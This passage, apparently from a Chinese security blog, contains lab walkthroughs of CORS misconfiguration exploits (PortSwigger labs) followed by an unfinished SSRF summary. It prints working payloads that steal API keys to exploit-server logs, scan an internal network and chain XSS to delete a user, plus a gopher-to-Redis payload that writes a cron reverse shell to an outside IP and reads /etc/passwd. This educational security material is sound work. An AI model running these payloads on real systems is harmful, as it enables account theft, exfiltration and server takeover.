2.挖掘 同上 3.利用 1,交互式xss。通过CORS，绕过一些反会话劫持的方法，如HTTP-Only限制的cookie，绑定IP地址的会话ID等，劫持用户会话。 2,程序猿在写ajax请求的时候，对目标域限制不严。有点类似于url跳转。facebook出现过这样一个案例。javascript通过url里的参数进行ajax请求。 ## 0x10 预防CORS漏洞 CORS漏洞主要是由于配置错误而引起的。所以，预防漏洞变成了一个配置问题。下面介绍了一些针对CORS攻击的有效防御措施。 1. 正确配置跨域请求 如果Web资源包含敏感信息，则应在Access-Control-Allow-Origin标头中正确指定来源。 2. 只允许信任的网站 看起来似乎很明显，但是Access-Control-Allow-Origin中指定的来源只能是受信任的站点。特别是，使用通配符来表示允许的跨域请求的来源而不进行验证很容易被利用，应该避免。 3. 避免将null列入白名单 避免使用标题Access-Control-Allow-Origin: null。来自内部文档和沙盒请求的跨域资源调用可以指定null来源。应针对私有和公共服务器的可信来源正确定义CORS头。 4. 避免在内部网络中使用通配符 避免在内部网络中使用通配符。当内部浏览器可以访问不受信任的外部域时，仅靠信任网络配置来保护内部资源是不够的。 5. CORS不能替代服务器端安全策略 CORS定义了浏览器的行为，绝不能替代服务器端对敏感数据的保护-攻击者可以直接从任何可信来源伪造请求。因此，除了正确配置的CORS之外，Web服务器还应继续对敏感数据应用保护，例如身份验证和会话管理。 ## 0x11 CORS靶场练习 该靶场内置了3个 CORS 的漏洞场景 - 场景一：信任任意 Origin 源 - 场景二：正则表达式检测 Origin 源 - 场景三：信任任意 null 源![image-20230510214108156](CORS跨域漏洞/image-20230510214108156.png) 漏洞检测: 一般情况下，修改请求包 Header 中的 Origin 字段为任意域名或者为 null 的方式去检测该漏洞是否存在。 #### 场景一：信任任意 Origin 源 应用程序接受来自任何 Origin 的 CORS 请求。该代码将 Origin 值放在 HTTP 响应头 Access-Control-Allow-Origin 中。现在，此配置将允许来自任何 Origin 的任何脚本向应用程序发出 CORS 请求。Web 浏览器将执行标准的 CORS 请求检查，来自恶意域的脚本将能够窃取数据。 应用程序接受 Origin 标头中指定的任何值。 ![image-20230510215219591](CORS跨域漏洞/image-20230510215219591.png) 可以看到箭头处的域名,是任意的,而该网站都允许域名发出请求并回显(origin处是我自己添加的) #### 场景二：正则表达式检测 Origin 源 应用程序已实施 CORS 策略并对列入白名单的域/子域执行“正则表达式”检查。在这种情况下，应用程序在代码中具有弱正则表达式实现，它只检查 HTTP 请求 Origin 标头中任何位置的域名 b0x.com 的存在。如果 HTTP 标头 Origin 的值为 inb0x.com 或 b0x.comlab.com，正则表达式会将其标记为通过。这种错误配置将导致跨源共享数据。 **应用程序信任列入白名单的 Origin。** ![image-20230510215728867](CORS跨域漏洞/image-20230510215728867.png) **应用程序不允许任何任意来源, 可以看到下图右侧没有CORS头** ![image-20230510215801410](CORS跨域漏洞/image-20230510215801410.png) 应用程序弱正则表达式允许在域名开头具有白名单域字符串的 Origin。 ![image-20230510215958783](CORS跨域漏洞/image-20230510215958783.png) 应用程序弱正则表达式允许在域名末尾具有白名单域字符串的 Origin。 ![image-20230510220029500](CORS跨域漏洞/image-20230510220029500.png) #### 场景三：信任null源 在这种情况下，应用程序 HTTP 响应标头 Access-Control-Allow-Origin 始终设置为 null。当用户指定 null 以外的任何值时，应用程序不会处理它并在 HTTP 响应中继续反映 null 。允许攻击者执行漏洞利用的技巧很少，并且可以使用 CORS 请求过滤受害者的数据。 **应用程序接受 Origin 标头中指定的 null 值。** ![image-20230510220243338](CORS跨域漏洞/image-20230510220243338.png) #### 注意事项 如果响应包 Header 中为以下情况 ，则不存在漏洞。 ``` Access-Control-Allow-Origin: * Access-Control-Allow-Credentials:true ``` ![image-20230510220310783](CORS跨域漏洞/image-20230510220310783.png) 原因是因为浏览器会对此类情况的请求进行自动拦截，不具备漏洞利用条件。 在 CORS-vulnerable-Lab 靶场的 POCs 目录下，有 CORS 漏洞利用的脚本 以 `arbitrary_origin_exploit.html` 为例，用文本编辑器打开该脚本文件，找到如下代码并根据实际应用场景进行修改 ````js &lt;script&gt; //向目标应用程序网页发出 CORS 请求以获取 HTTP 响应的函数 function exploit() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.readyState == 4 &amp;&amp; this.status == 200) { var all = this.responseText; document.getElementById(\"load\").innerHTML= all; // 分割打印被盗取的 HTTP 响应 } }; xhttp.open(\"GET\", \"http://192.168.126.6/CORS/arbitrary_origin.php\", true); //将 URL 更改为错误配置 CORS 策略的 URL xhttp.setRequestHeader(\"Accept\", \"text\\/html,application\\/xhtml+xml,application\\/xml;q=0.9,\\/;q=0.8\"); xhttp.setRequestHeader(\"Accept-Language\", \"en-US,en;q=0.5\"); xhttp.withCredentials = true; xhttp.send(); } &lt;/script&gt; 将利用脚本放置在搭建的恶意网站下，当受害者在同一浏览器登录目标网站，并打开该恶意链接，即可盗取目标网站的 HTTP 响应内容。 这里我复现不出来… 0x12 bp官网的靶场练习 实验一: 具有基本原点反射的 CORS 漏洞 信息: 该网站具有不安全的CORS配置，因为它信任所有来源。 要解决该实验室问题，请编写一些使用 CORS 检索管理员 API 密钥并将代码上传到漏洞利用服务器的 JavaScript。当您成功提交管理员的 API 密钥时，该实验就解决了。 您可以使用以下凭据登录到您自己的帐户：wiener:peter 首先开启bp代理,同时关闭拦截,记录你浏览网页的请求 登陆账号，查看历史记录并观察到密钥是通过AJAX请求/accountDetails检索的，并且响应包含Access-Control-Allow-Credentials标头，表明它可能支持CORS 接下来我们将其发送到重发器,验证是否有CORS漏洞 如上图我们在请求区添加origin头,并写入随意的一个域名,响应后发现右侧的CORS头出现我们输入的域名(不论我们的域名是什么),这说明的确存在CORS漏洞, 即允许任意源的访问 接下来我们要编写js脚本,意在向服务器发送获取管理员详细信息的请求(这里是cookie),并将请求得到的数据存放在我们的日志中 https://0ac200c803b3121486c4a98700c50006: 此处换成你实验室的url即可 &lt;script&gt; var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0ac200c803b3121486c4a98700c50006.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='/log?key='+this.responseText; }; &lt;/script&gt; 接着将该脚本添加到漏洞服务器中(发送给受害者),查看你的日志,如下图可以看到成功得到管理员的apikey 如上图,从左到右依次点击即可 实验室二：受信任空源的CORS漏洞 提示: 这个网站有一个不安全的CORS配置，因为它信任“null”来源。 为了解决这个实验，编写一些JavaScript，使用CORS检索管理员的API密钥并将代码上传到漏洞利用服务器。当您成功提交管理员的API密钥时，该实验就解决了. 您可以使用以下凭据登录到自己的帐户：wiener:peter 同上题 登陆账号，单击\"我的帐户\"，查看历史记录并观察到密钥是通过AJAX请求/accountDetails检索的，并且响应包含Access-Control-Allow-Credentials标头，表明它可能支持CORS 经过实验发现,这次不能允许任意源的访问了,那我们给origin赋值为null看看响应,发现成功响应 接着用iframe构造null源的请求来绕过 在浏览器中，转到漏洞利用服务器并输入以下HTML（将YOUR-LAB-ID替换为实验室URL的URL，将YOUR-EXPLOIT-SERVER-ID替换为漏洞利用服务器ID） &lt;iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" srcdoc=\"&lt;script&gt; var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText); }; &lt;/script&gt;\"&gt;&lt;/iframe&gt; 我的是： &lt;iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" srcdoc=\"&lt;script&gt; var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a3100d803693dd6813ff78900520003.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='https://exploit-0a8900c2034a3d9a8119f65d01ab00f8.exploit-server.net/log?key='+encodeURIComponent(this.responseText); }; &lt;/script&gt;\"&gt;&lt;/iframe&gt; 注意iframe沙箱的使用，因为这会生成一个空的源请求。 原因如下：GPT回答 这里iframe沙箱为何会产生一个空的源请求？ //ChatGPT 在给定的代码中，使用了一个具有沙箱属性的 &lt;iframe&gt; 元素，它的 sandbox 属性被设置为 \"allow-scripts allow-top-navigation allow-forms\"。这些属性指定了一组沙箱规则，用于限制嵌入的文档的行为。 其中，allow-scripts 属性允许嵌入的文档执行脚本，allow-top-navigation 属性允许嵌入的文档导航到顶级窗口，allow-forms 属性允许嵌入的文档提交表单。 **当使用具有沙箱属性的 &lt;iframe&gt; 元素时，如果没有指定 src 属性，则会执行 srcdoc 属性的内容作为内联文档。在这种情况下，内联文档的源被视为一个空字符串。** 由于源被视为一个空字符串，因此在发出请求时，浏览器会创建一个空的初始请求，因为没有指定具体的源。这个初始请求不会导致真正的网络请求，也不会发送到服务器。因此，你观察到的是一个空的源请求。 需要注意的是，沙箱属性可以提供一定的安全性，但它仍然需要在合适的场景和正确的使用方式下才能发挥作用。开发者应该仔细考虑并评估是否需要使用沙箱以及如何设置沙箱属性，以确保安全性和功能之间的平衡。 单击\"查看漏洞利用\"（view）。观察漏洞利用是否有效-已登录到日志页面，API密钥位于URL中（测试poc的可行性，就不在这测了，直接到发给受害者） 返回到利用漏洞攻击服务器并单击\"将利用漏洞攻击发送给受害者\"。 成功!!! 实验三: 受信任的不安全协议的CORS漏洞 提示: 1、此网站具有不安全的CORS配置，因为它信任所有子域，而不管协议如何。 2、解决实验：编制JavaScript，使用CORS检索管理员的API密钥并将代码上载到漏洞利用服务器。并提交api key 3、已有账号：wiener:peter 如上图,依旧可能存在CORS漏洞,发送到重发器验证 此时将origin标头改为: Origin:http://subdomain.lab-id （lab-id 是实验室域名） 我的是： Origin:http://subdomain.0a9800610460650c822b3861005c0050.web-security-academy.net 如上图成功发现利用漏洞(发现其任意子域都可以访问) 组合利用 打开一个产品页面，单击Check stock并观察它是使用一个子域上的HTTP URL加载的 接下来验证该子域是否存在XSS漏洞,如下图,响应中并没有对我们的恶意代码进行某些必要的编码过滤,因此的确存在XSS漏洞 在浏览器中，转到漏洞利用服务器并输入以下HTML，将YOUR-LAB-ID替换为您的唯一实验室URL，将YOUR-EXPLOIT-SERVER-ID替换为您的漏洞利用服务器ID： &lt;script&gt; document.location=\"http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4&lt;script&gt; var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script&gt;&amp;storeId=1\" &lt;/script&gt; 我的是： &lt;script&gt; document.location=\"http://stock.0a9800610460650c822b3861005c0050.web-security-academy.net/?productId=4&lt;script&gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a9800610460650c822b3861005c0050.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a6c00a2045f65df82f537b4017f003e.exploit-server.net/log?key='%2bthis.responseText; };%3c/script&gt;&amp;storeId=1\" &lt;/script&gt; 实验四: CORS漏洞与内部网络枢轴攻击 提示: 1、此网站具有不安全的CORS配置，因为它信任所有内部网络来源。 2、完成实验：编制JavaScript来定位本地网络（192.168.0.0/24，端口8080）上的端点，然后使用该端点来识别和创建基于CORS的攻击以删除用户。删除用户Carlos后，实验将得到解决。 part1: 需要扫描本地网络以查找端点。将$collaboratorPayload替换为Collaborator有效负载或漏洞利用服务器URL &lt;script&gt; var q = [], collaboratorURL = 'http://exploit-0a3f00c203b3ea2480b9112e01ce00d9.exploit-server.net/'; for(i=1;i&lt;=255;i++) { q.push(function(url) { return function(wait) { fetchUrl(url, wait); } }('http://192.168.0.'+i+':8080')); } for(i=1;i&lt;=20;i++){ if(q.length)q.shift()(i*100); } function fetchUrl(url, wait) { var controller = new AbortController(), signal = controller.signal; fetch(url, {signal}).then(r =&gt; r.text().then(text =&gt; { location = collaboratorURL + '?ip='+url.replace(/^http:\\/\\//,'')+'&amp;code='+encodeURIComponent(text)+'&amp;'+Date.now(); })) .catch(e =&gt; { if(q.length) { q.shift()(wait); } }); setTimeout(x =&gt; { controller.abort(); if(q.length) { q.shift()(wait); } }, wait); } &lt;/script&gt; 上述代码解析：GPT回答 解析： 1.定义了一个空数组 q 用于存储异步请求的队列。 2.定义了一个 collaboratorURL 变量，指定了协作者的 URL。 3.使用一个 for 循环从 1 到 255，生成了一系列函数，并将这些函数添加到队列 q 中。每个生成的函数将调用 fetchUrl(url, wait) 函数，并将不同的 IP 地址组合成一个 URL。 4.使用另一个 for 循环从 1 到 20，不断从队列 q 中取出函数，并调用它们，传递不同的等待时间参数。 5.定义了一个 fetchUrl(url, wait) 函数，用于发起异步请求。 6.创建了一个 AbortController 对象和对应的 signal 信号。 7.使用 fetch 函数发送一个 GET 请求到指定的 URL，并指定 signal 作为参数传递给请求选项。 8.当请求成功返回时，将响应的文本内容作为参数拼接到指定的协作者 URL，并进行重定向。 9.如果请求失败，则判断队列 q 是否还有剩余的函数，如果有，则取出下一个函数并执行。 10.使用 setTimeout 设置一个超时定时器，当超时时，终止请求并执行与上述相同的处理逻辑。 这段代码的目的是通过循环异步请求来尝试访问本地网络中的 HTTP 服务，并将响应的文本内容发送到协作者的服务器。 在漏洞利用服务器中输入以下代码。单击存储，然后单击“将漏洞利用发送给受害者”。 检查日志或Collaborator交互组件，并查看发送给它的代码参数 发现: 192.168.0.175:8080 part2: 重新在利用漏洞攻击服务器中输入以下代码。将$ip替换为从协作者交互中检索到的IP地址和端口号。不要忘记添加Collaborator有效负载或再次利用服务器URL。更新并提供漏洞利用。 &lt;script&gt; function xss(url, text, vector) { location = url + '/login?time='+Date.now()+'&amp;username='+encodeURIComponent(vector)+'&amp;password=test&amp;csrf='+text.match(/csrf\" value=\"([^\"]+)\"/)[1]; } function fetchUrl(url, collaboratorURL){ fetch(url).then(r =&gt; r.text().then(text =&gt; { xss(url, text, '\"&gt;&lt;img src='+collaboratorURL+'?foundXSS=1&gt;'); })) } fetchUrl(\"http://192.168.0.175:8080\", \"http://exploit-0a3f00c203b3ea2480b9112e01ce00d9.exploit-server.net/\"); &lt;/script&gt; 代码解析：GPT回答 解析： 1.定义了一个 xss(url, text, vector) 函数，用于执行 XSS 攻击。 2.构造了一个带有恶意 XSS 脚本的 URL，该 URL 包含了目标网站的登录页面地址、时间戳、恶意用户名和密码、以及来自目标网站的 CSRF 令牌。 3.将当前页面的 location 设置为构造的恶意 URL，从而实现跳转和注入恶意脚本的目的。 4.定义了一个 fetchUrl(url, collaboratorURL) 函数，用于发送异步请求获取目标 URL 的响应内容，并触发 XSS 攻击。 5.使用 fetch 函数发送一个 GET 请求到目标 URL，并获取响应的文本内容。 6.在响应返回时，将目标 URL、响应文本和恶意向量作为参数传递给 xss 函数，以触发 XSS 攻击。 7.调用 fetchUrl 函数，传递目标 URL 和协作者 URL 作为参数，以发起异步请求并触发 XSS 攻击。 这段代码的目的是通过发送异步请求来获取目标网站的响应内容，并在响应内容中注入恶意的 XSS 脚本代码。通过构造恶意的登录 URL，并将当前页面的 location 设置为该 URL，当用户访问该页面时，恶意的 XSS 脚本将执行并在用户的浏览器上执行攻击者所期望的操作。 现在我们将探测用户名字段中的XSS漏洞。 检索URL中具有foundXSS=1的Collaborator交互；或者在日志中看到foundXSS=1 part3: 重新在利用漏洞攻击服务器中输入以下代码。将$ip替换为与步骤2中相同的IP地址和端口号，再次添加Collaborator有效负载或漏洞利用服务器。更新并提供漏洞利用 &lt;script&gt; function xss(url, text, vector) { location = url + '/login?time='+Date.now()+'&amp;username='+encodeURIComponent(vector)+'&amp;password=test&amp;csrf='+text.match(/csrf\" value=\"([^\"]+)\"/)[1]; } function fetchUrl(url, collaboratorURL){ fetch(url).then(r=&gt;r.text().then(text=&gt; { xss(url, text, '\"&gt;&lt;iframe src=/admin onload=\"new Image().src=\\''+collaboratorURL+'?code=\\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)\"&gt;'); } )) } fetchUrl(\"http://192.168.0.175:8080\", \"http://exploit-0a3f00c203b3ea2480b9112e01ce00d9.exploit-server.net/\"); &lt;/script&gt; Collaborator交互或利用服务器日志会提供管理页面的源代码 part4： 检索源代码，会注意到有一个允许删除用户的表单。重新在利用漏洞攻击服务器中输入以下代码。将$ip替换为相同的IP地址和端口号。 // 源代码 &lt;script src=\"/resources/labheader/js/labHeader.js\"&gt;&lt;/script&gt; &lt;div id=\"academyLabHeader\"&gt; &lt;section class=\"academyLabBanner\"&gt; &lt;div class=\"container\"&gt; &lt;div class=\"logo\"&gt;&lt;/div&gt; &lt;div class=\"title-container\"&gt; &lt;h2&gt;CORS vulnerability with internal network pivot attack&lt;/h2&gt; &lt;a id=\"exploit-link\" class=\"button\" target=\"_blank\" href=\"http://exploit-0a3f00c203b3ea2480b9112e01ce00d9.exploit-server.net\"&gt;Go to exploit server&lt;/a&gt; &lt;a class=\"link-back\" href=\"https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack\"&gt; Back&amp;nbsp;to&amp;nbsp;lab&amp;nbsp;description&amp;nbsp; &lt;svg version=\"1.1\" id=\"Layer_1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" x=\"0px\" y=\"0px\" viewBox=\"0 0 28 30\" enable-background=\"new 0 0 28 30\" xml:space=\"preserve\" title=\"back-arrow\"&gt; &lt;g&gt; &lt;polygon points=\"1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15\"&gt;&lt;/polygon&gt; &lt;polygon points=\"14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15\"&gt;&lt;/polygon&gt; &lt;/g&gt; &lt;/svg&gt; &lt;/a&gt; &lt;/div&gt; &lt;div class=\"widgetcontainer-lab-status is-notsolved\"&gt; &lt;span&gt;LAB&lt;/span&gt; &lt;p&gt;Not solved&lt;/p&gt; &lt;span class=\"lab-status-icon\"&gt;&lt;/span&gt; &lt;/div&gt; &lt;/div&gt; &lt;/section&gt;&lt;/div&gt; &lt;div theme=\"\"&gt; &lt;section class=\"maincontainer\"&gt; &lt;div class=\"container is-page\"&gt; &lt;header class=\"navigation-header\"&gt; &lt;section class=\"top-links\"&gt; &lt;a href=\"/\"&gt;Home&lt;/a&gt;&lt;p&gt;|&lt;/p&gt; &lt;a href=\"/admin\"&gt;Admin panel&lt;/a&gt;&lt;p&gt;|&lt;/p&gt; &lt;a href=\"/my-account?id=administrator\"&gt;My account&lt;/a&gt;&lt;p&gt;|&lt;/p&gt; &lt;/section&gt; &lt;/header&gt; &lt;header class=\"notification-header\"&gt; &lt;/header&gt; &lt;form style=\"margin-top: 1em\" class=\"login-form\" action=\"/admin/delete\" method=\"POST\"&gt; &lt;input required=\"\" type=\"hidden\" name=\"csrf\" value=\"Mn2Dj8wVciUoD89vrl36Io4lkfpFQQG0\"&gt; &lt;label&gt;Username&lt;/label&gt; &lt;input required=\"\" type=\"text\" name=\"username\"&gt; &lt;button class=\"button\" type=\"submit\"&gt;Delete user&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;/section&gt; &lt;/div&gt; HTTP/1.1\" 200 \"User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\" // 脚本 &lt;script&gt; function xss(url, text, vector) { location = url + '/login?time='+Date.now()+'&amp;username='+encodeURIComponent(vector)+'&amp;password=test&amp;csrf='+text.match(/csrf\" value=\"([^\"]+)\"/)[1]; } function fetchUrl(url){ fetch(url).then(r=&gt;r.text().then(text=&gt; { xss(url, text, '\"&gt;&lt;iframe src=/admin onload=\"var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\\'carlos\\',f.submit()\"&gt;'); } )) } fetchUrl(\"http://192.168.0.175:8080\"); &lt;/script&gt; 代码解析：GPT回答 解析： 1.定义了一个 xss(url, text, vector) 函数，用于执行 XSS 攻击。 2.构造了一个带有恶意 XSS 脚本的 URL，该 URL 包含了目标网站的登录页面地址、时间戳、恶意用户名和密码、以及来自目标网站的 CSRF 令牌。 3.将当前页面的 location 设置为构造的恶意 URL，从而实现跳转和注入恶意脚本的目的。 4.定义了一个 fetchUrl(url) 函数，用于发送异步请求获取目标 URL 的响应内容，并触发 XSS 攻击。 5.使用 fetch 函数发送一个 GET 请求到目标 URL，并获取响应的文本内容。 6.在响应返回时，将目标 URL、响应文本和恶意向量作为参数传递给 xss 函数，以触发 XSS 攻击。 7.在构造恶意向量时，使用了一个包含 &lt;iframe&gt; 元素的恶意 XSS 脚本代码。该 &lt;iframe&gt; 元素的 src 属性设置为 /admin，并在加载完成时触发一个 JavaScript 代码，该代码会找到目标页面中的表单，将用户名字段（如果存在）设置为 'carlos'，然后自动提交表单。 8.调用 fetchUrl 函数，传递目标 URL 作为参数，以发起异步请求并触发 XSS 攻击。 这段代码的目的是通过发送异步请求来获取目标网站的响应内容，并在响应内容中注入恶意的 XSS 脚本代码。通过构造恶意的登录 URL，并将当前页面的 location 设置为该 URL，当用户访问该页面时，恶意的 XSS 脚本将执行并在用户的浏览器上执行攻击者所期望的操作。 代码通过注入一个指向/admin页面的iframe提交表单以删除carlos 详情参考: https://blog.csdn.net/qq_53079406/article/details/128696923?spm=1001.2014.3001.5502","categories":["常见top漏洞"]},{"title":"ssrf漏洞总结","path":"/2023/07/26/qian-xi-ssrf-lou-dong/","content":"ssrf漏洞总结 一、SSRF是什么？ SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。 一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统） 二、SSRF漏洞原理 SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。 比如,黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器 其形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制 导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据 数据流:攻击者-----&gt;服务器----&gt;目标地址 即：利用一个可以发起网络请求的服务（存在缺陷的web应用），当作跳板来攻击其他服务器。 我的理解是攻击者利用一个存在缺陷的web应用（服务器），而该服务器可以访问受害者的服务器，那么攻击者对web应用发起一种请求（要获取受害者服务器内网资源的请求），该web应用由于对该请求没有做出严格的过滤，被认为该请求是安全的，返回受害者服务器的内部资源和数据 什么是内网访问 csdn上看了一篇大佬的文章，感觉挺通俗易懂。我就简单复述一下，加深一下印象。 首先需要了解一下公有ip和私有ip 公有ip:公有ip是全球唯一的，需要注册才能使用。而且是可以直接上网的。 私有ip：私有ip不需要注册，因此，他不能直接上网。我们平时上网一般都是通过网络运营商（移动，联通，电信）。原理就是这些个运营商呀，他们是购买了公有ip的。然后他们分配给我们这些用户，我们使用的就是私有ip，或者叫局域网。这样的话，就会导致你和你周围的邻居们分出来的私有ip可能是一样的。 这样的好处是我们大家都可以方便的上网，当然也有不利之处，那就是两家相同私有ip同时访问百度页面，这个百度的服务器怎么分辨这两家分别是谁呢。这个就要用到另外一个东西：端口映射。 什么是端口映射 端口映射是NAT的一种，他将外网IP地址的一个端口映射到内网中一台机器，提供相应的服务。当用户访问该IP的这个端口时，服务器自动将请求映射到对应局域网的内部机器上，现在市场是的家庭路由器都具备NAT功能，也可以实现端口映射。下图是小米路由器的端口映射设置图： 对于这个概念，我个人的理解就是外网的ip地址的一个端口与内网的一个端口(或许是直接对应到内网的某个服务器?下面的图更好理解)实现对应。 我们平时经过路由器，通过宽带，最终去到运营商那边，数据是从运营商出去，最终数据是回到运营商那边，运营商再把数据发送到用户的电脑。 路由器，至少有两个端口：WAN 口和 LAN 口。 WAN：接外部 IP 地址用，通常指的是出口，转发来自内部 LAN 接口的 IP 数据包，这个口的 IP 是唯一的。 LAN：接内部 IP 地址用，LAN 内部是交换机。 A 电脑的 IP 是局域网 IP（192.168.31.11），这个 IP（192.168.31.11）是从路由器的 lan口分配的。 当我们上百度的时候，经过路由器的 wan口，进行相应的IP、端口转化：192.168.31.11:80 -&gt; 10.221.0.24:8080,所以，从 wan口出去的地址为：10.221.0.24:8080。 最后，经过运营商，运营商那边会做相应的端口映射（而且是动态端口映射），子网 IP（10.221.0.24:8080）转化为公网IP（128.0.0.1:8888），通过这个公网 IP 去访问百度服务器 这位博主贴的图也是非常的形象，上面也有详细的介绍。简单来说，就是左下角和右下角两个ip地址对应的都是用户的私有ip，然后通过LAN将子网进行转换。然后再通过WAN口将子网转为公网。 三、漏洞挖掘 危害与利用： 1、端口扫描 对外网、服务器所在内网、本地进行端口扫描 eg：http://example.com/ssrf.php?url=http://192.168.139.1:80/ 通过应用响应时间、返回的错误信息，未开放端口会显示空白或者报错，开放端口会显示服务的banner信息 ​ ​ 2、攻击内网、本地漏洞服务 ​ ​ 攻击运行在内网或本地的应用程序（溢出、弱口令等） ​ ​ 利用Gopher协议拓展攻击面 ​ ​ 3、内网Web应用指纹识别、攻击漏洞应用 ​ ​ 访问默认文件，对内网web应用进行指纹识别（框架，平台，模块以及CMS等 ） ​ ​ 攻击内外网的web应用，主要是使用get参数就可以实现的攻击（如struts2，sqli等）; ​ ​ 第一步，应用指纹识别----&gt;第二步，寻找漏洞-----&gt;第三步，漏洞利用 ​ ​ 4、文件读取 ​ ​ 读取本地文件，利用file协议读取本地文件，提交参数等 ​ ​ http://example.com/ssrf.php?url=file:///etc/passwd 1、可以对服务器所在的内网环境进行端口扫描、资源访问 2、利用漏洞和Payload进一步攻击运行其他的应用程序; 3、对内网web应用进行指纹识别，通过访问应用存在的默认文件实现 4、GET型漏洞利用，GET参数就可以实现的攻击，比如struts2漏洞利用等 5、POST型漏洞利用，可利用gopher协议进行参数构造; 6、利用Redis未授权访问getshell、Weblogic默认SSRF漏洞页面 7、如果ssrf漏洞存在于云服务器 攻击元数据服务 攻击存储桶 攻击Kubelet API 越权攻击云平台内其他组件或服务 漏洞场景： 1、通过URL地址进行网页分享; http://share.xxx.com/index.php?url=http://www.xxx.com 2、转码服务，通过URL地址把原地址的网页转换格式 3、图片加载与下载，一般是通过url参数进行图片获取 http://image.xxx.com/image.php?image=http://www.xxx.com 4、未公开的api实现以及其他调用url的功能; 5、设备后台管理进行存活测试; 6、远程资源调用功能; 7、数据库内置功能; 8、编辑器进行远程图片抓取，如: ueditor; 9、打包附件或者内容编辑并导出时 10、PDF生成或导出 11、从URL关键字中寻找 利用google 语法加上这些关键字去寻找SSRF漏洞 share wap url link src source target u display sourceURl imageURL domain 简单来说：所有目标服务器会从自身发起请求的功能点，且我们可以控制地址的参数，都可能造成SSRF漏洞 从远程服务器请求资源（Upload from URL，Import &amp; Export RSS Feed） 数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB） Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP） 文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML） 利用技巧 利用条件：被攻击的服务等没有开启加密传输与鉴权。 端口扫描（扫描内网） 攻击内网存在漏洞的服务 攻击Web应用进行指纹识别及其中的漏洞 如果PHP安装了expect扩展，可以通过expect协议执行系统命令 dos攻击 file 协议暴力枚举敏感文件 Redis未授权漏洞的6种利用方法 保存文件到www目录，形成webshell 创建authorized_keys文件，利用ssh 私钥登录服务器 写计划任务(/var/spool/cron/ &amp; /etc/cron.d/) slave of 8.8.8.8 主从模式利用 写入到/etc/profile.d/ 用户环境变量修改 开启AOF持久化纯文本记录 appendfilename 存在SSRF漏洞的站点主要利用四个协议，分别是http、file、gopher、dict协议 file协议进行本地文件的读取 http协议进行内网的ip扫描、端口探测 探测到6379端口开放，可以利用http、gopher、dict这几个协议来打开放6379端口的redis服务。 最常见的是通过file、dict、gopher这三个协议来进行渗透。 curl -vvv 'dict://127.0.0.1:6379/info' curl -vvv 'file:///etc/passwd' # * 注意: 链接使用单引号，避免$变量问题 curl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a' 四、产生SSRF漏洞的函数 SSRF攻击可能存在任何语言编写的应用，接下来将举例php中可能存在SSRF漏洞的函数。 1、file_get_contents:（只能使用GET方式获取数据） 下面的代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随机文件名保存在硬盘上，并展示给用户。 定义：把整个文件读入一个字符串中 语法：file_get_contents(path,include_path,context,start,max_length) 参数\t描述 path\t必需。要读取的文件 include_path\t可选。要在 include_path 中搜寻文件，将该参数设为 \"1\" context\t可选。规定文件句柄的环境，context 是一套可以修改流的行为的选项。若使用 null，则忽略。 start\t可选。文件中开始读取的位置 (适用于PHP 5.1以后) max_length\t可选。读取的字节数 (适用于PHP 5.1以后) &lt;?php if (isset($_POST['url'])) { $content = file_get_contents($_POST['url']); $filename ='./images/'.rand().';img1.jpg'; file_put_contents($filename, $content); echo $_POST['url']; $img = \"&lt;img 